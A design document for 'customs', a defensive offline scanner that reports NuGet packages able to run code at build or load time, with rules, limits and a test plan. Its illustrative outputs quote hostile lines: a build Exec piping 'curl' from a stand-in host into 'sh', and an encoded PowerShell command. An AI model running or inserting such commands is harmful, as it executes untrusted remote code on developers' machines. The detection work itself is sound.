# customs design

This document is the contract. Code that disagrees with it is a bug in one of the two, and the fix says which.

customs never evaluates MSBuild and never loads an assembly. It reads the dependency graph that NuGet restore already resolved, from the lock file or the assets file, and inspects the files of each package as data. That is what lets it run without the .NET SDK, on any machine, on input an attacker wrote. It is also the source of most of its limits, which are listed under [What it cannot see](#what-it-cannot-see). See [ADR 0001](adr/0001-static-reading-only.md).

## The problem and who has it

A NuGet package can run code on the machine that restores and builds it:

| Where | When it runs | Source |
| --- | --- | --- |
| `.props` and `.targets` in `build/`, `buildMultitargeting/`, `buildTransitive/` | Every build of a project that references the package. MSBuild imports them automatically. | [NuGet docs, package folder conventions](https://learn.microsoft.com/en-us/nuget/create-packages/creating-a-package), read 2026-11-22 |
| Inline tasks (`UsingTask` with `CodeTaskFactory` or `RoslynCodeTaskFactory`) inside those files | At build time, compiled and run inside MSBuild. | [ReversingLabs, 2023-10-31](https://reversinglabs.com/blog/iamreboot-malicious-nuget-packages-exploit-msbuild-loophole) |
| Analyzers and source generators in `analyzers/` | At compile time, loaded into the compiler, and in the IDE. | [NuGet docs, controlling dependency assets](https://learn.microsoft.com/en-us/nuget/consume-packages/package-references-in-project-files), read 2026-11-22 |
| A module initialiser in any assembly | When the assembly loads, before any of its other code. | [ECMA-335 augments, dotnet/runtime](https://github.com/dotnet/runtime/blob/main/docs/design/specs/Ecma-335-Augments.md); [ReversingLabs, 2024-07-11](https://reversinglabs.com/blog/malicious-nuget-campaign-uses-homoglyphs-and-il-weaving-to-fool-devs) |
| PowerShell scripts in `tools/` | In Visual Studio's Package Manager Console. The older campaigns used `init.ps1`. | NuGet docs above; ReversingLabs 2023 above |
| Native binaries in `runtimes/*/native/` | When the application calls into them. | NuGet docs above |

The people who have this problem are .NET teams that accept dependency bumps from Dependabot or Renovate and build them in CI with secrets in the environment. They review the diff of a version number. Nothing in that diff says that the new version added a `buildTransitive` target that runs `curl`.

What they can do today:

- Write `ExcludeAssets` by hand on each `PackageReference` ([Meziantou](https://www.meziantou.net/limit-what-nuget-packages-can-do-in-your-project.htm), read 2026-11-22). This works, but only if they know which packages bring which assets.
- NuGetAudit, on by default, checks against the GitHub Advisory Database. It reports known vulnerabilities, not package contents ([Microsoft Learn](https://learn.microsoft.com/en-us/nuget/concepts/auditing-packages), read 2026-11-22).
- osv-scanner reads `packages.lock.json` and matches known IDs. It does not open packages.
- GuardDog inspects package contents for PyPI, npm, Go, RubyGems, GitHub Actions and VS Code extensions. Not NuGet ([README](https://github.com/DataDog/guarddog), read 2026-11-22).
- Socket has covered NuGet since a public beta on 2025-04-21, as a hosted service ([announcement](https://socket.dev/blog/introducing-net-support)).

customs is for the team that wants the answer locally, offline, in CI, without an account, and wants it to say what changed.

## Goals

1. List every package in a resolved graph that can run code at build time or at load time, and say how.
2. Report the specific constructs the published attacks used, at the file and line where they are.
3. On a version bump, report only what the new version adds.
4. Let a team accept the current state once, in a file they review, and then see only changes.
5. Never hide a gap. A scan that could not read a package, or stopped at a limit, says so and exits with its own code.
6. Treat every input as hostile and stay within stated limits of memory and time on any input.
7. Run with no network unless a download is needed for `diff`, and then only to nuget.org, and only if allowed.

## Non-goals

- Deciding whether a package is malicious. customs reports capabilities and constructs. A finding means "this runs on your machine", not "this is malware".
- Evaluating MSBuild, resolving properties or conditions, or running anything.
- Analysing method bodies of library code for malicious logic.
- Deobfuscation.
- A reputation service, a hosted database, telemetry, or an account.
- Changing the user's project, for example by writing `ExcludeAssets`. The report says which assets a package brings so a person can decide.
- `packages.config` projects. They have no lock or assets file of the kind read here.

## What it cannot see

This list goes into the README and the `--help` text. Each item has a test that pins the behaviour, so a change in what customs can see is a visible change.

- **Logic in ordinary library code.** The Socket case of 2025-11-06 hides sabotage in extension methods with date checks. The StripeApi.Net and Sicoob.Sdk cases of 2026 steal data from normal methods. customs reports none of this. A test builds a package in that shape and asserts that only inventory notes come out.
- **What a property expands to.** `<Exec Command="$(Cmd)" />` is reported as an `Exec` with the literal text `$(Cmd)`. A URL assembled from properties is not seen as a URL.
- **Which condition is true.** Every `Exec` is reported, also the ones whose `Condition` is false on this machine.
- **Obfuscation beyond the marker list.** A renamed or custom obfuscator passes. Markers are names in metadata, and an attacker can remove or fake them.
- **What a module initialiser does.** customs reports that one exists and how large its body is, not what it calls.
- **Run-time behaviour.** Anything decided at run time: downloaded code, reflection, loading of other assemblies.
- **Packages outside the graph files.** MSBuild project SDKs (`<Project Sdk="Name/Version">`), `PackageDownload` items and `dotnet tool` packages may not appear in `packages.lock.json` or in the `libraries` of `project.assets.json` (to be confirmed, see open questions). `contentFiles` source code, which is compiled into the user's assembly, is listed in the inventory but not inspected.
- **A cache that was changed after restore.** customs reads the extracted files in the global packages folder, which is what MSBuild imports. If something changed those files, customs reports the changed files, but it does not compare them against the original package unless asked to with `--verify-cache`.
- **Packages it cannot read.** These are reported as incomplete, never skipped silently.

## The user's view

One binary, `customs`, with three commands. Paths can be files or directories. A directory is searched for `packages.lock.json` and `obj/project.assets.json`, skipping `.git`, `bin` and `node_modules`.

### `customs scan`

```
customs scan [PATH...] [--packages-dir DIR] [--baseline FILE] [--write-baseline FILE]
             [--format text|json|sarif] [--output FILE] [--fail-on note|warning|error|never]
             [--verify-cache]
```

Inputs, detected by name and content:

- `packages.lock.json` (format versions 1 and 2): every package entry of type `Direct`, `Transitive` or `CentralTransitive`, for every target framework. `Project` entries are skipped.
- `project.assets.json` (versions 3 and 4): every `libraries` entry of type `package`. The package folders come from its `packageFolders`, in order.
- A `.nupkg` file: that one package, read from the archive.
- `--packages-dir DIR` alone: every package version in a global packages folder.

For a lock file, packages are looked up in `NUGET_PACKAGES` if set, else `~/.nuget/packages` (`%USERPROFILE%\.nuget\packages` on Windows), else in `--packages-dir`. A package that is in the graph and not on disk makes the scan incomplete. `scan` never downloads; run `dotnet restore` first.

Example, on a made-up package (illustrative, not real output):

```
$ customs scan src/Shop.Api/packages.lock.json
customs 0.1.0: 214 packages in 1 graph, all found

Contoso.Build.Tools 3.2.0  (transitive, via Contoso.Sdk)
  note     C101  build assets: buildTransitive/Contoso.Build.Tools.targets (+2 imported files)
  error    C201  inline task with RoslynCodeTaskFactory
                 buildTransitive/tasks/Fetch.targets:14  <UsingTask TaskName="Fetch" TaskFactory="RoslynCodeTaskFactory" ...>
  warning  C203  Exec
                 buildTransitive/tasks/Fetch.targets:31  Command="powershell -enc SQBFAFgA..."
  warning  C206  base64 string, 1,204 characters
                 buildTransitive/tasks/Fetch.targets:31

Contoso.Analyzers 1.0.4  (direct)
  note     C102  analyzer: analyzers/dotnet/cs/Contoso.Analyzers.dll
  error    C301  module initialiser in a build-time assembly (412 bytes of IL)
                 analyzers/dotnet/cs/Contoso.Analyzers.dll

2 errors, 2 warnings, 2 notes (3 more accepted by the baseline)
exit 1: findings at or above --fail-on warning
```

Text from packages is printed escaped: control characters, bidirectional overrides and non-printing characters are shown as `\u{...}`. See [Security](#security-considerations).

`--write-baseline FILE` writes every current finding to a baseline file and exits 0. `--baseline FILE` hides findings whose fingerprint is in the file, and counts them.

`--verify-cache` also opens the `.nupkg` kept in each global packages folder entry, checks it against the hash in the lock or assets file, and reports any file whose extracted copy differs from the archive.

### `customs diff`

```
customs diff OLD NEW [--offline] [--cache-dir DIR] [--packages-dir DIR] [--baseline FILE]
                     [--format text|json|sarif] [--output FILE] [--fail-on ...]
```

`OLD` and `NEW` are two lock files or two assets files, typically the base branch and the pull request:

```
git show origin/main:src/Shop.Api/packages.lock.json > old.lock.json
customs diff old.lock.json src/Shop.Api/packages.lock.json --format sarif --output customs.sarif
```

For each package whose resolved version changed, and for each new package, customs scans the new version and, if there was one, the old version. It reports the findings of the new version whose fingerprints the old version does not have. A capability that is new, such as build assets in a package that had none, is raised from note to warning. Removed packages are not reported.

Each version is taken from the local package folders first. If it is not there and `--offline` is not given, it is downloaded from the nuget.org flat-container endpoint, `https://api.nuget.org/v3-flatcontainer/{id}/{version}/{id}.{version}.nupkg`, with the ID lowercased and the version normalised and lowercased ([Microsoft Learn](https://learn.microsoft.com/en-us/nuget/api/package-base-address-resource), read 2026-11-22; base URL confirmed in the service index on 2026-11-22). The download is checked against the content hash in the graph file before it is opened. It is kept in `--cache-dir`, default `customs-cache` under the system temporary directory, as the `.nupkg` file only; nothing is extracted to disk.

Example (illustrative):

```
$ customs diff old.lock.json packages.lock.json
customs 0.1.0: 3 packages changed (2 bumped, 1 added), 1 downloaded from nuget.org

Contoso.Http 4.1.0 -> 4.2.0
  warning  C101  new build assets: buildTransitive/Contoso.Http.targets
  warning  C203  new Exec
                 buildTransitive/Contoso.Http.targets:12  Command="curl -s https://example.invalid/i | sh"
  warning  C205  new URL
                 buildTransitive/Contoso.Http.targets:12  https://example.invalid/i

0 errors, 3 warnings, 0 notes
exit 1: findings at or above --fail-on warning
```

### `customs rules`

Prints the rule table below with IDs, default severities and one line each.

### Exit codes

| Code | Meaning |
| --- | --- |
| 0 | Scan complete, no finding at or above `--fail-on` outside the baseline. |
| 1 | At least one finding at or above `--fail-on` outside the baseline. |
| 2 | Usage error, or an input that could not be read as a graph at all. Nothing meaningful was scanned. |
| 3 | No finding at or above `--fail-on`, but the scan was incomplete: a package was missing, a download failed, or a limit stopped reading. |

Precedence is 2, then 1, then 3. `--fail-on` defaults to `warning`. `--fail-on never` always exits 0 or 2 or 3, for teams that only want the report. There is deliberately no flag that turns 3 into 0; a team that accepts a gap writes it into the baseline, where a reviewer sees it.

### Rules

Default severities are a starting point. The benign corpus decides the final ones before the first release, and any change is recorded here.

| ID | Severity | What |
| --- | --- | --- |
| C001 | (incomplete) | A package in the graph was not found on disk or could not be downloaded. |
| C002 | (incomplete) | A limit stopped reading. The message names the limit and the file. |
| C003 | warning | An archive entry with `..`, an absolute path or a drive letter, or two entries whose names are equal ignoring case. |
| C004 | warning | An MSBuild file that is not well-formed XML, has a DTD, or uses an encoding other than UTF-8 or UTF-16. |
| C005 | error | A downloaded package, or a cached one with `--verify-cache`, does not match the content hash in the graph file. |
| C101 | note | Build assets: props or targets in `build/`, `buildTransitive/`, `buildMultitargeting/` or the old `buildCrossTargeting/`. |
| C102 | note | Analyzer or source generator assembly in `analyzers/`. |
| C103 | note | PowerShell script in `tools/`. |
| C104 | note | Native binary: a PE, ELF or Mach-O file that is not a managed assembly. |
| C105 | note | `contentFiles` source code that will be compiled into the project. |
| C201 | error | `UsingTask` with a `TaskFactory`: `CodeTaskFactory`, `RoslynCodeTaskFactory` or any other. |
| C202 | note | `UsingTask` with `AssemblyFile`: an assembly that MSBuild loads. That assembly gets the C3xx checks as build-time code. The path is often a property (Grpc.Tools 2.60.0 uses `$(_Protobuf_MsBuildAssembly)`), so every managed assembly under `build*/` or `tools/` is treated as build-time code too. |
| C203 | warning | `Exec` task. |
| C204 | warning | `DownloadFile` task. |
| C205 | warning | A URL (`http`, `https`, `ftp`) in an attribute value or element text. Comments are ignored. |
| C206 | warning | A base64-looking run of at least 200 characters. |
| C207 | note | An `Import` that cannot be resolved inside the package. |
| C301 | warning | Module initialiser: `<Module>` has a `.cctor`. |
| C302 | warning | P/Invoke to a function on the short list (memory protection, process injection, dynamic loading). |
| C303 | note | Marker of a known obfuscator. |
| C304 | warning | A `.dll` or `.exe` under `lib/`, `ref/`, `runtimes/*/lib/` or `analyzers/` that is not a readable managed assembly. |
| C401 | error | Package ID contains non-ASCII characters. |
| C402 | error | Package ID is a look-alike of a popular ID: same skeleton, different ID. |
| C403 | warning | Package ID is one edit, or only separators, away from a popular ID, and not itself popular. |

C3xx findings in a build-time assembly (an analyzer or an assembly named by `UsingTask`) are raised one step, because that code runs in the compiler or in MSBuild on every build.

### Output formats

- **text**: grouped by package, as above. Colour only on a terminal and unless `NO_COLOR` is set.
- **json**: one object: `schema` (integer, starts at 1), `tool` (name, version), `inputs`, `packages` (ID, version, where it was read from, whether it is complete), `findings` (rule, severity, package, version, path, line, message, evidence, fingerprint, whether the baseline accepted it) and `incomplete`. Field names do not change within a schema version.
- **sarif**: SARIF 2.1.0 ([OASIS](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html)). One `run`, rules from the table above, `level` from the severity. The physical location is the graph file and the line of the package's entry in it, because that is the file in the user's repository; the path inside the package is in the message and in `properties`. Whether GitHub code scanning displays this well is an open question.

### Baseline file

```json
{
  "schema": 1,
  "accepted": [
    {
      "fingerprint": "5d0c6b0e9a3f41c2b8e7d1a4f6c9e2b7",
      "rule": "C203",
      "package": "Contoso.Build.Tools",
      "path": "buildTransitive/tasks/Fetch.targets",
      "note": ""
    }
  ]
}
```

Sorted by package, rule and path, so that a change to it reads well in a diff. `note` is for the reviewer and ignored by the tool. The fingerprint is defined in [ADR 0004](adr/0004-version-free-fingerprints.md): it does not include the version or the line, so a bump that changes nothing relevant stays accepted, and it does include the evidence, so a bump that changes the command does not.

## Architecture

One crate with a library and a thin binary. The library is pure where it can be; I/O sits at the edges.

```
inputs ─> graph ─> locate ─> package files ─> inventory ─> detectors ─> findings ─> baseline ─> report ─> exit code
          (pure)    (I/O)        (I/O,          (pure)       (pure)                   (pure)      (pure)
                                 limits)
                      └─> fetch (I/O, diff only)
```

### Modules

| Module | Does | I/O |
| --- | --- | --- |
| `cli` | Parses arguments, picks the command, maps the result to an exit code, writes the report. | stdout, files |
| `graph` | Parses lock and assets files into a `Graph`. Normalises IDs and versions. | none |
| `locate` | Finds each package: global packages folder, fallback folders, a single `.nupkg`, the download cache. | file system reads |
| `archive` | Reads a `.nupkg` through the `zip` crate: lists entries, reads one entry with caps. | file reads |
| `folder` | Lists an extracted package directory, without following links, and reads one file with caps. | file reads |
| `inventory` | Classifies package paths into assets. | none |
| `msbuild` | Rules C201 to C207 over one parsed XML document; resolves literal imports between files of the package. | none |
| `assembly` | PE headers through `object`; a minimal ECMA-335 metadata reader of its own; rules C301 to C304. | none |
| `names` | Rules C401 to C403 against the embedded list of popular IDs. | none |
| `fetch` | Downloads from the flat container and checks the hash. Behind the `fetch` cargo feature, on by default. | network, cache directory |
| `hash` | NuGet content hash of a `.nupkg`, including the variant for signed packages. | none |
| `baseline` | Reads and writes the baseline, filters findings. | none (the caller reads the file) |
| `report` | Text, JSON and SARIF writers into any `Write`. Escaping of untrusted text. | none |

`archive` and `folder` give `inventory` and the detectors the same view: a list of entries (normalised path, size) and a function that reads one entry up to a cap. Detectors receive bytes or `&str`, never paths on disk.

### Main types

- `PackageId`: the ID as written, with comparison and hashing on the lowercase form, as NuGet compares IDs case-insensitively.
- `PackageVersion`: the version as written, plus its NuGet normalised form (no build metadata, no trailing `.0` fourth part, no leading zeros), which names the folder and the download URL.
- `PackageRef`: ID, version, direct or transitive, target frameworks, content hash if the graph file has one.
- `PackagePath`: a path inside a package with `/` separators, checked once at construction (no `..`, not absolute). Folder matching is case-insensitive.
- `Asset`: `Build { folder, entry_point }`, `Analyzer`, `PowerShell`, `Native { format }`, `Managed { role }`, `ContentSource`, `Other`.
- `Finding`: rule, severity, package, version, path, line, message, evidence, fingerprint.
- `Severity`: `Note < Warning < Error`. Incomplete results are a separate type, `Gap`, not a severity, so they cannot be filtered away by `--fail-on`.
- `Limits`: all the caps below in one value, passed down explicitly. Tests run with small limits to reach them cheaply.
- `Scan`: packages, findings and gaps. `diff` is a function of two `Scan` values plus the two graphs.

### Limits

Starting values. Each has a test with an input just over it. Reaching one produces a C002 gap, never a crash and never silence.

| Limit | Value |
| --- | --- |
| Graph file size | 64 MiB |
| `.nupkg` size | 1 GiB |
| Entries in one package | 50,000 |
| Path length in a package | 1,024 bytes, 64 segments |
| Bytes read from one entry | 8 MiB for MSBuild and scripts, 128 MiB for assemblies, 64 bytes for native-binary detection |
| Decompression ratio while reading an entry | 200 to 1 |
| Total bytes read per package | 512 MiB |
| XML nodes per document | 200,000 (roxmltree `nodes_limit`) |
| Metadata table rows | 2^24 per table, as a token row index has 24 bits |
| Download size | 1 GiB, with a 60 second timeout |

Entries that no rule needs to read, such as documentation, images and large native files, are listed by name and size and never decompressed. That keeps a scan of a graph with large runtime packages cheap.

## The hard parts

### Hostile archives and files

Zip bombs, path traversal and absurd entry counts are handled by the limits above and by never writing package content to disk. Entry names are only used to classify, never to open a file. Reads go through a counting reader that stops at the cap and at the compression ratio, whatever the header claims. XML is parsed by roxmltree with DTDs off (its default) and a node limit; a DTD is reported as C004 rather than parsed. Assembly reading bounds-checks every offset and size against the slice it came from, with checked arithmetic, and every table index against the row count.

### Agreeing with NuGet about what is in a package

If customs and NuGet disagree about the files in a package, an attacker can show customs one thing and MSBuild another. Three choices reduce that:

1. When a package is in the global packages folder, customs reads the extracted files, because those are the files MSBuild imports. It reads the archive only for a `.nupkg` input and for downloads in `diff`. See [ADR 0005](adr/0005-read-what-msbuild-imports.md).
2. Folder names are matched case-insensitively (`Build/`, `BUILD/`), and entries whose names collide ignoring case are reported (C003).
3. With `--verify-cache`, the cached archive is compared with the extracted files and with the graph's hash.

What remains: the `zip` crate and .NET's `System.IO.Compression` may disagree on malformed archives, for example data before the first entry, two end-of-central-directory records, or a local header that contradicts the central directory. M6 builds such archives and records what each reader does. Where they disagree, customs reports the archive as C003 instead of choosing.

### MSBuild without evaluation

customs scans every `.props`, `.targets` and `.tasks` file in the package, not only the entry points `build/<id>.props` and `build/<id>.targets`, because an entry point can import any other file. It then marks which files are reachable from an entry point through `Import` elements with literal paths relative to `$(MSBuildThisFileDirectory)`. An import it cannot resolve is C207. A finding in a file that no entry point reaches is still reported, with a note that the file is not imported by a known path; an attacker can import it through a property.

A test pins the reason: a package whose entry point imports `tasks/a.targets`, which holds the inline task. A version of the scanner that only reads entry points misses it, and the must-catch test fails.

Encodings: MSBuild files are usually UTF-8, sometimes UTF-16 with a byte order mark. customs decodes both; anything else is C004.

### Reading ECMA-335 metadata

The module initialiser check needs the `TypeDef` and `MethodDef` tables, P/Invokes need `ImplMap` and `ModuleRef`, and obfuscator markers need `TypeDef`, `TypeRef` and `CustomAttribute`. The tables are stored back to back, and each row size depends on heap size flags and on the row counts of other tables, so a reader has to know the schema of every table up to the last one it reads. customs implements that reader itself, about the size of the ECMA-335 partition II chapter 22 schema, rather than depending on a full .NET analysis crate. See [ADR 0002](adr/0002-own-metadata-reader.md).

The module initialiser is the type initialiser of the `<Module>` type ([ECMA-335 augments](https://github.com/dotnet/runtime/blob/main/docs/design/specs/Ecma-335-Augments.md)), which is the first row of `TypeDef`. customs looks in that row's method range for a method named `.cctor` with the `RTSpecialName` flag, and reads the method header to report the body size.

Correctness is checked against a reference implementation, `System.Reflection.Metadata`. A small C# program in `tools/metadata-oracle/` prints, for each assembly, the row count of every table, whether `<Module>` has a `.cctor`, and every `ImplMap` entry. Its output for the fixture assemblies and for every assembly in the benign corpus is committed as JSON. The tests compare customs against it. The .NET SDK is needed only to regenerate those files, not to build or test customs.

### False positives

A tool that flags the legitimate packages that ship build logic gets removed from CI in a week. The project brief named Grpc.Tools and SourceLink as packages with `Exec`. Checked in a local cache on 2026-11-22, Grpc.Tools 2.60.0 and the SourceLink packages there contain no `Exec` at all; Grpc.Tools runs its own task assembly through `UsingTask` (C202). Which legitimate packages trip which rule is therefore measured, not assumed. Three things address it:

1. **A benign corpus.** The 300 most downloaded packages on nuget.org, latest stable versions, pinned in `corpus/benign.txt` with ID, version and SHA-512. A script downloads them into a local directory. A test, ignored by default and run in a weekly CI job and before each detection milestone ends, scans them all. Every finding they produce must be listed in `corpus/benign-expected.txt` with a one-line reason a person wrote. The test fails on a finding that is not listed and on a listed finding that no longer appears. No `error` finding is allowed in the benign corpus.
2. **The baseline**, so that what a team has reviewed stays quiet.
3. **Severities decided by data.** If a rule produces many reviewed, harmless warnings in the corpus, its default drops to note, and that is written in the rule table.

The README of the first release publishes the numbers: how many of the 300 packages produce any finding, by rule.

### Look-alike package IDs

The NuGet client accepts IDs that match `^\w+([.-]\w+)*$`, and in .NET `\w` includes non-Latin letters. A newer, optional restricted set allows only ASCII letters, digits, dots, dashes and underscores ([PackageIdValidator.cs](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.Packaging/PackageCreation/Utility/PackageIdValidator.cs), read 2026-11-22). The 2024 campaign published `Gսոa.UI3.Wіnfօrms` with Armenian letters. So:

- C401: any non-ASCII character in an ID is an error on its own. No list is needed.
- C402: the Unicode confusable skeleton (UTS #39, through the `unicode-security` crate) of the ID equals the skeleton of a popular ID, and the IDs differ.
- C403: an optimal string alignment distance of 1, or a difference only in `.`, `-` and `_`, to a popular ID that is not the ID itself, on lowercase forms, for IDs of at least 6 characters.

The popular list is the top 4,000 IDs by downloads from the nuget.org search API (the API allows `skip` up to 3,000 and `take` up to 1,000, per [Microsoft Learn](https://learn.microsoft.com/en-us/nuget/api/search-query-service-resource), read 2026-11-22). It is generated by a script, dated, committed as `data/popular-ids.txt` and embedded at compile time. The tool does not fetch it.

Not caught: an ID that extends a popular one (`ZendeskApi.Client.V2`, `StripeApi.Net`). Many legitimate packages extend popular IDs, and flagging them would bury everything else. A test pins that `StripeApi.Net` is not flagged, so the gap stays visible.

A self-test checks the list against itself: no popular ID may flag another popular ID except the pairs reviewed in `data/popular-pairs.txt`.

### Fingerprints

See [ADR 0004](adr/0004-version-free-fingerprints.md). A fingerprint is the first 128 bits of SHA-256 over the rule ID, the lowercase package ID, the path inside the package, and the evidence with whitespace collapsed. The evidence of each rule is defined with the rule: for `Exec` it is the `Command` attribute, for a module initialiser the assembly path and the body size, for a URL the URL. Line numbers and versions are not part of it.

### Checking downloads

A lock file holds a `contentHash` per package and an assets file a `sha512`. For an unsigned package that is the SHA-512 of the `.nupkg`. For a signed package it is not: NuGet hashes the package without its signature ([PackageArchiveReader.GetContentHash](https://github.com/NuGet/NuGet.Client/blob/dev/src/NuGet.Core/NuGet.Packaging/PackageArchiveReader.cs), read 2026-11-22). Checked locally on 2026-11-22: for two signed Microsoft packages the assets `sha512` equals the content hash in `.nupkg.metadata` and differs from the plain SHA-512 in `.nupkg.sha512`; for unsigned packages all three agree. customs implements the signed-package hash in `hash`. The test computes it for every signed package in the local cache and in the benign corpus and compares it with `.nupkg.metadata`. Until that test passes, `diff` does not open a download it cannot verify; it reports C005.

## Testing strategy

| Level | What | Runs |
| --- | --- | --- |
| Unit | Pure functions: version normalisation, path classification, each rule on small inputs, fingerprints, escaping, exit code precedence. | `cargo test`, every OS |
| Golden output | Text, JSON and SARIF for fixture scans compared with committed files. `CUSTOMS_BLESS=1` rewrites them; the diff is reviewed. | `cargo test` |
| Must catch | One test per published technique, building the package in the test from a description: the 2023 inline task in `build/<id>.targets`, the same through an import, in `buildTransitive`, `Exec` with a download, `DownloadFile`, a base64 payload, `tools/init.ps1`, a module initialiser in a library and in an analyzer, a P/Invoke to `VirtualProtect`, an obfuscator marker, the Armenian look-alike ID, a one-edit ID, a separator-only ID. | `cargo test` |
| Must not catch, honestly | The Socket-shaped package (logic in an extension method) and `StripeApi.Net`. The test asserts they produce only inventory notes, so the README's "cannot see" list stays true. | `cargo test` |
| Known-wrong variants | Each detection milestone tries named mutations by hand and records the result in the roadmap: only entry-point files scanned; case-sensitive folder match; `TypeDef` row 2 taken as `<Module>`; heap index width ignored; fingerprint including the version. Each must make a test fail. A mutation that no test catches gets a test. | by hand, recorded |
| Metadata oracle | customs against `System.Reflection.Metadata` on fixture and corpus assemblies. | `cargo test` (committed JSON) |
| Benign corpus | 300 packages, every finding reviewed. | weekly CI job, before each detection milestone ends |
| Properties | Random and mutated bytes into every parser: no panic, memory and time within limits. proptest. | `cargo test`, every OS |
| Fuzzing | cargo-fuzz targets for archive listing, XML rules, PE and metadata, lock and assets parsing. | Linux CI, one minute per target per push; one hour per target before release |

Assembly fixtures are compiled from C# sources in `tests/fixtures/assemblies/src` by a script and committed as small binaries, with the oracle output next to them. They do nothing when loaded; customs never loads them anyway. No live malware is stored anywhere in the repository.

## Platform support

Linux, macOS and Windows, x86_64 and aarch64 where CI has runners. CI tests on all three. Paths inside packages always use `/`; paths on disk use the platform's rules. The global packages folder is `NUGET_PACKAGES` if set, else `~/.nuget/packages`. customs does not read `NuGet.Config`; a custom `globalPackagesFolder` is given with `--packages-dir`, and the assets file names its folders anyway. On Windows, long paths in the cache are opened with the platform's normal API; a path that cannot be opened is a C001 gap.

## Security considerations

- **No execution, no loading.** Nothing from a package is executed, loaded or extracted to disk. Downloads are stored as the `.nupkg` file only.
- **Terminal injection.** Package text (paths, attribute values, IDs) can contain ANSI escape sequences or bidirectional overrides. The text writer escapes every control character, every character in the Unicode `Bidi_Control` set and every non-printing character. A golden test feeds a package with such text and checks the escaped output. JSON and SARIF get their escaping from `serde_json`.
- **Network.** Only `diff` uses the network, only for packages missing locally, only over HTTPS, only to the flat-container base URL, with redirects limited to HTTPS. `--offline` turns it off. Package IDs and versions go to nuget.org, which is what `dotnet restore` does too.
- **Download integrity.** A download is opened only after its hash matches the graph file. The cache is keyed by ID, version and hash.
- **Resource limits.** See [Limits](#limits). Every limit has a test.
- **Self.** `unsafe` is forbidden in the crate. Dependencies are few, permissively licensed and checked by `cargo deny` in CI.

## Decisions

- [ADR 0001](adr/0001-static-reading-only.md): read the resolved graph and package files; never evaluate MSBuild or load assemblies.
- [ADR 0002](adr/0002-own-metadata-reader.md): a minimal ECMA-335 reader of its own instead of dotscope.
- [ADR 0003](adr/0003-rules-in-rust-not-yara.md): rules as Rust code with small data files, not YARA-X.
- [ADR 0004](adr/0004-version-free-fingerprints.md): fingerprints without version and line, with evidence.
- [ADR 0005](adr/0005-read-what-msbuild-imports.md): read the extracted global packages folder when it exists, the archive otherwise.

## Dependencies

Planned, none added yet. Versions and licences checked on crates.io on 2026-11-22.

| Crate | Version | Licence | Why |
| --- | --- | --- | --- |
| `zip` | 9.8.1 | MIT | Reading `.nupkg` archives. Only the `deflate` feature; other methods are reported. Needs Rust 1.89. |
| `roxmltree` | 0.21.2 | MIT OR Apache-2.0 | MSBuild XML with positions, DTDs off by default, a node limit. Read-only, which is all customs needs. |
| `object` | 0.41.0 | Apache-2.0 OR MIT | PE headers, sections, the CLI data directory, and telling PE, ELF and Mach-O apart. Only read features. |
| `serde`, `serde_json` | 1.0.229, 1.0.154 | MIT OR Apache-2.0 | Lock and assets files, baseline, JSON and SARIF output. |
| `lexopt` | 0.3.2 | MIT | Argument parsing for three commands. Small and without dependencies, unlike clap. |
| `sha2` | 0.11.1 | MIT OR Apache-2.0 | SHA-512 content hashes and SHA-256 fingerprints. Needs Rust 1.88. |
| `unicode-security` | 0.1.3 | MIT/Apache-2.0 | UTS #39 confusable skeletons for C402. |
| `ureq` | 3.5.2 | MIT OR Apache-2.0 | Blocking HTTPS for `diff` downloads, behind the `fetch` feature. No async runtime. |
| `proptest` (dev) | | MIT OR Apache-2.0 | Property tests of the parsers. |

Not planned: `dotscope` (ADR 0002), `yara-x` (ADR 0003), `clap` (more than three commands need), `serde-sarif` (the subset of SARIF needed is small and its last release was 2025-05-09), a string distance crate (optimal string alignment is a few lines).

The minimum Rust version rises from 1.85 to 1.89 when `zip` is added at M1. The CI MSRV job moves with it.

## Open questions

Things the design depends on that could not be confirmed on 2026-11-22. Each is settled in the milestone that needs it, and the answer is written here.

1. Does nuget.org still accept new package IDs with non-ASCII letters, or does it now apply the restricted ASCII set? C401 is useful either way for older packages, but its weight changes. (M4)
2. Does the lock file's `contentHash` equal the assets file's `sha512` and the `.nupkg.metadata` content hash for signed packages? Assets and metadata agreed on two signed packages; the lock file was not checked. (M5)
3. The exact algorithm for the signed-package content hash, reproduced from NuGet's source and tested against the cache. (M5)
4. Does NuGet match the `build`, `buildTransitive` and `analyzers` folder names case-insensitively on Linux and macOS as on Windows? customs matches case-insensitively either way; the answer decides whether a mismatch deserves its own finding. (M1)
5. Does Visual Studio 2026 still run `tools/init.ps1` for PackageReference projects? The NuGet docs say only that `tools` is on the Package Manager Console's `PATH`. C103 stays a note until this is known. (M2)
6. Where do `zip` and `System.IO.Compression` disagree on malformed archives? (M6)
7. The search API parameter `sortBy=totalDownloads-desc` is not in the documentation. On 2026-11-22 it worked, and the default order without a query was the same for the first five results. The list script records which one it used. (M4)
8. How GitHub code scanning shows SARIF results whose location is a line in a lock file. (M4)
9. The dependency tree of `zip` with only `deflate`, and of `ureq` with its default TLS, under `cargo deny` with this repository's licence list. (M1, M5)
10. Which obfuscator markers are reliable. Each needs a real sample before it goes into the list. Candidate markers come from public detection code and vendor documentation; customs copies names, not code. (M3)
11. How large the 300-package benign corpus is to download, and whether it fits in the GitHub Actions cache. (M2)
12. Do `PackageDownload` items and project SDK packages appear in the assets or lock file? If they do, they are scanned; if not, they stay in "cannot see". (M1)
13. How deep an element nesting roxmltree accepts before it fails, and whether that failure is clean. (M6)
14. Does MSBuild accept DTDs and UTF-16 in imported files? If it rejects them, C004 could drop to note, since such a file would break the build. (M2)
